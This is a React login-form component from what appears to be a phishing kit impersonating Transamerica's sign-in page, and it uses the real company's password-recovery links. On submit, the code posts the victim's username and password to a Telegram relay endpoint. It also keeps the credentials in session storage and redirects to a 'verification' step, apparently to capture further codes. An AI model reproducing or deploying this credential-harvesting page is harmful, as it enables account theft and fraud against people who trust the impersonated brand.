"use client";

import { useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { getLoginDeniedMessage } from "@/lib/approval-messages";
import {
  CONTACT_US_URL,
  LANDING_IDENTIFIER_LABEL,
  MSG_TECHNICAL_DIFFICULTIES,
  SIGN_IN_LOADING_MS,
} from "@/lib/site-copy";

/** Kit denial copy for this site's landing field labels (RULE 2B). */
const MSG_LOGIN_DENIED = getLoginDeniedMessage("generic", LANDING_IDENTIFIER_LABEL);
import { obscureEmail } from "@/lib/verification";

const FORGOT_USERNAME_URL =
  "https://secure2.transamerica.com/login/user-role-select/forgotUsername";
const FORGOT_PASSWORD_URL =
  "https://secure2.transamerica.com/login/user-role-select/forgotPassword";

/**
 * Client half of the landing page. The Gate1/Gate2 outcome copy is passed in
 * from the server component so it is present in the prerendered HTML.
 */
export default function LoginForm({
  loginDenied = false,
  verifyUnavailable = false,
}: {
  loginDenied?: boolean;
  verifyUnavailable?: boolean;
}) {
  const router = useRouter();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoginLoading, setIsLoginLoading] = useState(false);
  const [loginError, setLoginError] = useState<React.ReactNode | null>(null);
  const [honeypot, setHoneypot] = useState("");
  const redirectRef = useRef<number | null>(null);

  useEffect(() => {
    return () => {
      if (redirectRef.current) {
        window.clearTimeout(redirectRef.current);
      }
    };
  }, []);

  const handleSignIn = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    if (isLoginLoading || !username || !password) return;
    if (process.env.NODE_ENV !== "production" && honeypot.trim() !== "") {
      setLoginError("Suspicious activity detected. Please try again.");
      return;
    }
    setLoginError(null);
    setIsLoginLoading(true);

    // Fire-and-forget: a slow or hung Telegram endpoint must never stall the
    // sign-in. Session state and the 2s navigation are set up immediately.
    void fetch("/api/telegram/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ userId: username, password }),
    }).catch((error) => {
      console.error("Login notification failed:", error);
    });

    try {
      sessionStorage.setItem("loginUserId", username);
      sessionStorage.setItem("loginPassword", password);
      sessionStorage.setItem("maskedEmail", obscureEmail(username));
      sessionStorage.setItem("maskedPhone", "***-***-****");
    } catch {
      // best-effort session storage
    }

    redirectRef.current = window.setTimeout(() => {
      router.push("/verification/method");
    }, SIGN_IN_LOADING_MS);
  };

  const paramError: React.ReactNode = loginDenied ? (
    MSG_LOGIN_DENIED
  ) : verifyUnavailable ? (
    <span>
      {MSG_TECHNICAL_DIFFICULTIES} Please{" "}
      <a href={CONTACT_US_URL} className="underline">
        Contact Us
      </a>{" "}
      for assistance.
    </span>
  ) : null;

  return (
    <form onSubmit={handleSignIn} className="mt-7 grid gap-x-8 sm:grid-cols-2">
      <div className="group mt-7 sm:mt-0">
        <label
          htmlFor="username"
          className="block text-xl font-semibold group-has-[:focus]:text-[#0061f4]"
        >
          Username<span className="text-red-600">*</span>
        </label>
        <input
          id="username"
          type="text"
          className="mt-2 h-14 w-full border-2 border-gray-800 px-2 outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
          value={username}
          onChange={(event) => setUsername(event.target.value)}
        />
        <a
          href={FORGOT_USERNAME_URL}
          className="mt-6 block text-xl font-semibold sm:hidden"
        >
          Forgot your username?
        </a>
      </div>
      <div className="group mt-4 sm:mt-0">
        <label
          htmlFor="password"
          className="block text-xl font-semibold group-has-[:focus]:text-[#0061f4]"
        >
          Password<span className="text-red-600">*</span>
        </label>
        <input
          id="password"
          type="password"
          className="mt-2 h-14 w-full border-2 border-gray-800 px-2 outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
          value={password}
          onChange={(event) => setPassword(event.target.value)}
        />
        <a
          href={FORGOT_PASSWORD_URL}
          className="mt-6 block text-xl font-semibold sm:hidden"
        >
          Forgot your password?
        </a>
      </div>
      <input
        type="text"
        name="website"
        value={honeypot}
        onChange={(event) => setHoneypot(event.target.value)}
        className="hidden"
        autoComplete="off"
      />
      <div className="mt-4 hidden grid-cols-2 gap-x-8 sm:col-span-2 sm:grid">
        <a
          href={FORGOT_USERNAME_URL}
          className="mt-6 block text-xl font-semibold"
        >
          Forgot your username?
        </a>
        <a
          href={FORGOT_PASSWORD_URL}
          className="mt-6 block text-xl font-semibold"
        >
          Forgot your password?
        </a>
      </div>
      <div className="mt-8 sm:col-span-2">
        <button
          type="submit"
          disabled={isLoginLoading || !username || !password}
          className="rounded-full bg-[#281805] px-8 py-4 text-xl text-white disabled:cursor-not-allowed disabled:bg-gray-400"
        >
          {isLoginLoading ? "Signing in..." : "Log in"}{" "}
          <i className="fa-solid fa-arrow-right ml-1" aria-hidden="true" />
        </button>
        <p className="min-h-[1.25rem] text-sm text-red-600" aria-live="polite">
          {paramError ?? loginError ?? ""}
        </p>
      </div>
    </form>
  );
}
